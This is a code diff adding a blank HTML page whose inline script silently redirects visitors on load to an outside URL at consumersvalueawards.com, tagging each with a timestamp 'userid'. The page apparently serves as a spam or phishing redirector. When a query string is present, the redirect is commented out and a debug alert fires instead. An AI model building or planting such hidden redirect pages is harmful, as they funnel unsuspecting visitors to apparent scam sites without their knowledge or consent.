@@ -1,0 +1,26 @@
+<!DOCTYPE html><html>
+<head>
+<script>
+var dm="https://consumersvalueawards.com/claerw/wvrty/index.php?userid=";
+if(window.location.search){
+
+var text=window.location.search;
+	//var path= window.location.pathname.split('/')[1];
+	//alert(window.location.pathname);
+	var path= text.substring(1, text.lenght);
+	
+	//window.location.replace(dm+path);
+  alert("te:"+path);
+	//window.location.href= dm+path;
+}
+else {
+dm=dm+Date.now();
+
+//window.location.replace(dm);
+window.location.href= dm;
+}
+</script>
+</head>
+<body>
+</body>
+</html>
